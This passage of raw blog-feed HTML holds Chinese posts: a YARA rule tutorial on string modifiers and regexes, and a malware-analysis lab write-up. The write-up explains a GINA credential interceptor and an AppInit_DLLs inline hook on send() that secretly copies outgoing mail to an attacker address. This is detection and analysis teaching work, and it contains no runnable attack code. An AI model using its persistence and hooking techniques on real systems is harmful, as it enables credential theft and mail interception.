class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">Test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> (<span class="hljs-number">33</span> <span class="hljs-number">34</span> | <span class="hljs-number">36</span> <span class="hljs-number">37</span> | <span class="hljs-number">41</span> ?? <span class="hljs-number">4</span>?) <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>此时如果有一个字符串<code>12A0G9</code>的字符串也可以被检测到（这只是其中之一，可以根据条件自行构建字符串，并不是唯一的）。</p><h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><p>文本字符串都是这样定义的</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">Test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span><br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>这是最简单的情况：ASCII编码、区分大小写。文本字符串还可以包含以下C语言中可用的转义字符：</p><table><thead><tr><th>\“</th><th>双引号</th></tr></thead><tbody><tr><td>\\</td><td>反斜杠</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td>\t</td><td>水平标签</td></tr><tr><td>\n</td><td>回车换行</td></tr><tr><td>\xdd</td><td>十六进制表示</td></tr></tbody></table><p>文本字符串还可以附带一些有用的修饰符，这些修饰符可以改变字符串的解释方式。这些修饰符附加在由空格分隔的字符串定义的末尾。</p><h5 id="不区分大小写"><a href="#不区分大小写" class="headerlink" title="不区分大小写"></a>不区分大小写</h5><p>yara中默认文本字符串是区分大小写的，但是可以通过在字符串定义的末尾附加修饰符nocase将字符串转换为不区分大小写的模式。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">Test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> nocase<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>在测试文件中，改成大写的字符串</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/7.png"></p><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/8.png"></p><h5 id="宽字符串"><a href="#宽字符串" class="headerlink" title="宽字符串"></a>宽字符串</h5><p><code>wide</code>可以用于搜索宽字符串</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestWide</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> wide<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>写一个小DEMO，定义一个宽字符串</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> a[] = <span class="hljs-string">L&quot;this is a test&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ws\n&quot;</span>, a);<br></code></pre></div></td></tr></table></figure><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/9.png"></p><p>如果想同时搜索ASCII和宽字节字符串，可以将<code>ascii</code>和<code>wide</code>结合起来</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">rule TestWideAndAscii<br>&#123;<br>strings:<br><span class="hljs-built_in">$a</span> = <span class="hljs-string">&quot;this is a test&quot;</span> wide <span class="hljs-keyword">ascii</span><br>condition:<br><span class="hljs-built_in">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>在test.txt中写入this is a test，可以检测出宽字符的exe和ascii的txt</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/10.png"></p><h5 id="异或字符串"><a href="#异或字符串" class="headerlink" title="异或字符串"></a>异或字符串</h5><p><code>xor</code>可以用于搜索字符串的单字节xor结果，比如以下规则可以搜索“this is a test”的每个字符的异或。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestXor</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> xor<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在test.txt中写入“dxyc0yc0q0ducd”，这是“this is a test”每个字符与0x10异或后的结果。</p><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/11.png"></p><p>上面这个逻辑是等价于</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test<br>&#123;<br>strings:<br>$a = <span class="hljs-string">&quot;dxyc0yc0q0ducd&quot;</span><span class="hljs-comment">// this is a test 异或0x10结果</span><br>$b = <span class="hljs-string">&quot;fz&#123;a2&#123;a2s2fwaf&quot;</span><span class="hljs-comment">// this is a test 异或0x12结果</span><br>$c = &#123;<span class="hljs-number">8</span>b <span class="hljs-number">97</span> <span class="hljs-number">96</span> <span class="hljs-number">8</span>c df <span class="hljs-number">96</span> <span class="hljs-number">8</span>c df <span class="hljs-number">9</span>e df <span class="hljs-number">8</span>b <span class="hljs-number">9</span>a <span class="hljs-number">8</span>c <span class="hljs-number">8</span>b&#125;<br><span class="hljs-comment">//this is a test 异或0xFF结果</span><br><span class="hljs-keyword">condition</span>:<br>any of them<br>&#125;<br></code></pre></div></td></tr></table></figure><p>也可以将<code>wide</code>和<code>ascii</code>结合使用</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">rule testXorAsciiWide<br>&#123;<br><span class="hljs-built_in">string</span><span class="hljs-variable">s:</span><br>$<span class="hljs-keyword">a</span> = <span class="hljs-string">&quot;this is a test&quot;</span> <span class="hljs-built_in">xor</span> wide <span class="hljs-keyword">ascii</span><br><br>condition:<br>$<span class="hljs-keyword">a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>从yara3.11开始，可以控制异或的范围，如下所示。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestXor</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> xor(<span class="hljs-number">0x01</span><span class="hljs-number">-0x10</span>)<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="Base64字符串"><a href="#Base64字符串" class="headerlink" title="Base64字符串"></a>Base64字符串</h5><p><code>base64</code>可以用于搜索被base64编码过后的字符串，以下规则将搜索“this is a test”base64编码后的结果。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testBase64</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> base64<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>this is a testbase64编码后结果是：dGhpcyBpcyBhIHRlc3Q=</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/12.png"></p><p><code>base64wide</code>是搜索宽字符</p><h5 id="搜索完整词"><a href="#搜索完整词" class="headerlink" title="搜索完整词"></a>搜索完整词</h5><p><code>fullword</code>该修饰符保证字符串仅出现在由非字母数字字符分隔的文件中时才匹配。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testFullword</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;b1ackie&quot;</span> fullword<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这种时候，比如iamb1ackie和 <a href="http://www.b1ackieblog.com/">www.b1ackieblog.com</a> 都是不匹配的，但是可匹配 <a href="http://www.b1ackie.cn/">www.b1ackie.cn</a> 和 <a href="http://www.b1ackie-blog.com/">www.b1ackie-blog.com</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>正则表达式是yara最强大的功能之一，它们的定义方式与文本字符串相同，使用正斜杠而不是双引号括起来。</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">rule test<br>&#123;<br><span class="hljs-attr">strings</span>:<br><span class="hljs-symbol">$a</span> = <span class="hljs-regexp">/md5: [0-9a-fA-F]&#123;32&#125;/</span><br>condition:<br><span class="hljs-symbol">$a</span> <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/13.png"></p><p>也可以在正则表达式中使用文本修饰符，<code>nocase</code>、<code>ascii</code>、<code>wide</code>和<code>fullword</code>。</p><p>正则表达式还可以识别以下元字符</p><table><thead><tr><th>\</th><th>引用下一个元字符</th></tr></thead><tbody><tr><td>^</td><td>匹配文件的开头</td></tr><tr><td>$</td><td>匹配文件的结尾</td></tr><tr><td>|</td><td>交替</td></tr><tr><td>()</td><td>分组</td></tr><tr><td>[]</td><td>带括号的字符类</td></tr></tbody></table><p>也可以使用以下量词</p><table><thead><tr><th>*</th><th>匹配0次或多次</th></tr></thead><tbody><tr><td>+</td><td>匹配1次或多次</td></tr><tr><td>?</td><td>匹配0或1次</td></tr><tr><td>{n}</td><td>完全匹配n次</td></tr><tr><td>{n,}</td><td>至少匹配n次</td></tr><tr><td>{,m}</td><td>最多匹配n次</td></tr><tr><td>{n,m}</td><td>匹配n到m次</td></tr></tbody></table><p>这些量词还有一个非贪婪的变体，后面跟一个问号（？）</p><table><thead><tr><th>*?</th><th>匹配0次或多次，非贪婪</th></tr></thead><tbody><tr><td>+?</td><td>匹配1次或多次，非贪婪</td></tr><tr><td>??</td><td>匹配0或1次，非贪婪</td></tr><tr><td>{n}?</td><td>完全匹配n次，非贪婪</td></tr><tr><td>{n,}?</td><td>至少匹配n次，非贪婪</td></tr><tr><td>{,m}?</td><td>最多匹配n次，非贪婪</td></tr><tr><td>{n,m}?</td><td>匹配n到m次，非贪婪</td></tr></tbody></table><p>字符序列</p><table><thead><tr><th>\w</th><th>匹配一个单词字符（字母数字加_）</th></tr></thead><tbody><tr><td>\W</td><td>匹配一个非单词字符</td></tr><tr><td>\s</td><td>匹配一个空白字符</td></tr><tr><td>\S</td><td>匹配一个非空白字符</td></tr><tr><td>\d</td><td>匹配一个十进制数字字符</td></tr><tr><td>\D</td><td>匹配一个非数字字符</td></tr></tbody></table><h4 id="私有字符串"><a href="#私有字符串" class="headerlink" title="私有字符串"></a>私有字符串</h4><p>yara中的所有字符串都可以标记为<code>private</code>，这意味着它们将永远不会出现在yara的输出之中，当使用<code>-s</code>参数时也无法看到回显。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;asd&quot;</span> private<br>condition:<br><span class="hljs-variable">$a</span> <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/14.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p><a href="https://www.yuque.com/p1ut0/qtmgyx/eubd9v#4CpNb">https://www.yuque.com/p1ut0/qtmgyx/eubd9v#4CpNb</a></p><p><a href="https://bbs.pediy.com/thread-226011.htm#msg_header_h3_15">https://bbs.pediy.com/thread-226011.htm#msg_header_h3_15</a></p>]]></content>
    
    
    <categories>
      
      <category>YARA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>YARA</tag>
      
      <tag>恶意代码检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验11</title>
    <link href="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/"/>
    <url>/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-11-1"><a href="#Lab-11-1" class="headerlink" title="Lab 11-1"></a>Lab 11-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑监控行为，可以看到其向当前的目录下释放了一个Dll文件。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-1.png"></p><p>IDA查看，可以看到很明显的从资源节中释放文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-2.png"></p><p>之后会进行注册表的相关操作。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-3.png"></p><p>可以看到在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下创建了一个键值GinaDLL，值是释放的DLL的路径。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-4.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-5.png"></p><p>打开DLL文件，查看其导出表，可以看到大量的Wlx开头的函数，由此可以判断出这是一个GINA拦截，窃取用户登录凭证。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-6.png"></p><p>通过查看字符串可以看到一个msutil32.sys，仔细查看发现，是创建此文件，然后向其中写一些数据，写入的数据是什么需要继续往外分析，查看传入的参数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-7.png"></p><p>可以看到写入的数据，是一个结构体的相关信息。而这就是登录账户的信息。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">typedef struct _WLX_MPR_NOTIFY_INFO &#123;<br>  PWSTR pszUserName;<span class="hljs-regexp">//</span>登录账户名称<br>  PWSTR pszDomain;<span class="hljs-regexp">//</span>登录域名称<br>  PWSTR pszPassword;<span class="hljs-regexp">//</span>密码<br>  PWSTR pszOldPassword;<span class="hljs-regexp">//</span>旧密码<br>&#125; WLX_MPR_NOTIFY_INFO, *PWLX_MPR_NOTIFY_INFO;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-8.png"></p><h3 id="1-这个恶意代码向磁盘释放了什么？"><a href="#1-这个恶意代码向磁盘释放了什么？" class="headerlink" title="1.这个恶意代码向磁盘释放了什么？"></a>1.这个恶意代码向磁盘释放了什么？</h3><p>释放了一个msgina32.dll文件。</p><h3 id="2-这个恶意代码如何进行驻留？"><a href="#2-这个恶意代码如何进行驻留？" class="headerlink" title="2.这个恶意代码如何进行驻留？"></a>2.这个恶意代码如何进行驻留？</h3><p>设置注册表，成为winlogon的一员。</p><h3 id="3-这个恶意代码如何窃取用户登录凭证？"><a href="#3-这个恶意代码如何窃取用户登录凭证？" class="headerlink" title="3.这个恶意代码如何窃取用户登录凭证？"></a>3.这个恶意代码如何窃取用户登录凭证？</h3><p>GINA拦截用户登录信息</p><h3 id="4-这个恶意代码对窃取的证书做了什么处理？"><a href="#4-这个恶意代码对窃取的证书做了什么处理？" class="headerlink" title="4.这个恶意代码对窃取的证书做了什么处理？"></a>4.这个恶意代码对窃取的证书做了什么处理？</h3><p>将其保存到msutil32.sys文件中。</p><h3 id="5-如何在你的测试环境下让这个恶意代码获得用户凭证？"><a href="#5-如何在你的测试环境下让这个恶意代码获得用户凭证？" class="headerlink" title="5.如何在你的测试环境下让这个恶意代码获得用户凭证？"></a>5.如何在你的测试环境下让这个恶意代码获得用户凭证？</h3><p>需要先重启，启动拦截，然后注销系统，再次登录时，信息就会被记录。</p><h2 id="Lab-11-2"><a href="#Lab-11-2" class="headerlink" title="Lab 11-2"></a>Lab 11-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开DLL，看到DLL main函数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-1.png"></p><p>首先会尝试打开C:\Windows\system32\Lab11-02.ini这个文件，可以看到模式是打开存在的文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-2.png"></p><p>然后会读取文件中的数据，这是读取到的数据。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-3.png"></p><p>解密算法，解密出数据<a href="mailto:&#98;&#x69;&#x6c;&#108;&#121;&#x40;&#x6d;&#97;&#108;&#119;&#97;&#x72;&#101;&#97;&#110;&#x61;&#x6c;&#121;&#x73;&#x69;&#115;&#x62;&#111;&#111;&#x6b;&#x2e;&#x63;&#111;&#109;">&#98;&#x69;&#x6c;&#108;&#121;&#x40;&#x6d;&#97;&#108;&#119;&#97;&#x72;&#101;&#97;&#110;&#x61;&#x6c;&#121;&#x73;&#x69;&#115;&#x62;&#111;&#111;&#x6b;&#x2e;&#x63;&#111;&#109;</a>，是一个邮箱地址。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-4.png"></p><p>然后会进行比较当前运行的是否是THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE这三个程序，如果是的话会执行下面的三个函数</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-5.png"></p><p>之后会获取send函数的地址，来进行inline hook</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-6.png"></p><p>HOOK函数，关于inline hook的相关知识可以查看这里，<a href="https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/">inline hook</a></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-7.png"></p><p>inline hook前</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-8.png"></p><p>inline hook后</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-9.png"></p><p>查看HOOK后的jmp地址，这个函数检测send中发送的数据如果含有RCPT TO:，会加入一个新的RCPT TO: <a href="mailto:&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#97;&#x6c;&#119;&#97;&#114;&#x65;&#97;&#x6e;&#97;&#x6c;&#121;&#115;&#105;&#115;&#x62;&#111;&#x6f;&#x6b;&#46;&#x63;&#111;&#x6d;">&#x62;&#x69;&#x6c;&#x6c;&#121;&#64;&#x6d;&#97;&#x6c;&#119;&#97;&#114;&#x65;&#97;&#x6e;&#97;&#x6c;&#121;&#115;&#105;&#115;&#x62;&#111;&#x6f;&#x6b;&#46;&#x63;&#111;&#x6d;</a>，RCPT TO是收件人的意思，也就是发送的所有邮件都会被发送到恶意的邮箱去。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-11.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-12.png"></p><p>DLL还有一个导出函数install，可以看到是设置了一个键值。分析是在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs中设置了spoolvxx32.dll，这个键值的作用是当前所有加载user32.dll的程序都会再次加载此键值中的dll。之后会将自身复制到system32目录下。</p><p>但是实际测试中发现并没有实现，原因是在XP中这样可以实现，而在win7中不行。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-13.png"></p><p>win7需要按照如图中设置，即可实现DLL的注入。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-14.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-15.png"></p><h3 id="1-这个恶意DLL导出了什么？"><a href="#1-这个恶意DLL导出了什么？" class="headerlink" title="1.这个恶意DLL导出了什么？"></a>1.这个恶意DLL导出了什么？</h3><p>导出了一个install函数</p><h3 id="2-使用rundll32-exe安装这个恶意代码后，发生了什么？"><a href="#2-使用rundll32-exe安装这个恶意代码后，发生了什么？" class="headerlink" title="2.使用rundll32.exe安装这个恶意代码后，发生了什么？"></a>2.使用rundll32.exe安装这个恶意代码后，发生了什么？</h3><p>会将自身复制到system32目录下，还会设置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs，这会实现DLL的注入。</p><h3 id="3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？"><a href="#3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？" class="headerlink" title="3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？"></a>3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</h3><p>根据上面分析可知必须放在system32目录下。</p><h3 id="4-这个安装的恶意代码如何驻留？"><a href="#4-这个安装的恶意代码如何驻留？" class="headerlink" title="4.这个安装的恶意代码如何驻留？"></a>4.这个安装的恶意代码如何驻留？</h3><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs在这个键值中写入DLL的路径，可以实现持久化驻留。</p><h3 id="5-这个恶意代码采用的用户态Rootkit技术是什么？"><a href="#5-这个恶意代码采用的用户态Rootkit技术是什么？" class="headerlink" title="5.这个恶意代码采用的用户态Rootkit技术是什么？"></a>5.这个恶意代码采用的用户态Rootkit技术是什么？</h3><p>inline hook</p><h3 id="6-挂钩代码做了什么？"><a href="#6-挂钩代码做了什么？" class="headerlink" title="6.挂钩代码做了什么？"></a>6.挂钩代码做了什么？</h3><p>修改了send函数，所有向外发送包含RCPT TO：几个字符的邮件会被额外添加一行，发送给恶意账户。</p><h3 id="7-哪个或者哪些进程执行了这个恶意攻击，为什么？"><a href="#7-哪个或者哪些进程执行了这个恶意攻击，为什么？" class="headerlink" title="7.哪个或者哪些进程执行了这个恶意攻击，为什么？"></a>7.哪个或者哪些进程执行了这个恶意攻击，为什么？</h3><p>THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE，查询发现，它们都是邮件进程</p><h3 id="8-ini文件的意义是什么？"><a href="#8-ini文件的意义是什么？" class="headerlink" 